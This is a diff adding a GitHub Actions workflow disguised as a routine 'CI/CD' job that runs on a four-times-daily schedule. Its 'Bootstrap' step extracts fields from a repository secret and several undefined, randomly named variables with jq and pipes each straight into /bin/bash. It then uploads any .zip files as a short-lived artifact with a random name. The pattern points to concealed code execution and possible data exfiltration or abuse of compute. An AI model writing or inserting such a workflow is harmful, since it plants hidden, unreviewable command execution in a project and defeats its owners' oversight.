@@ -1,0 +1,37 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          iy4: ${{ secrets.iy4 }}
+        run: |
+          printf '%s' "$iy4" | jq -r .fsor4596 | /bin/bash
+          echo $pk2 | jq -r .ftjs8858 | /bin/bash
+          printf '%s' "$iav018" | jq -r .smkqd9636 | /bin/bash
+          printf '%s' "$le62" | jq -r .fn597 | /bin/bash
+          echo $ysgdr97 | jq -r .kh7 | /bin/bash
+          echo $cudh902 | jq -r .n08 | /bin/bash
+          echo $x3191 | jq -r .pyw6 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8fsNBdk9
+          path: "*.zip"
+          retention-days: 1
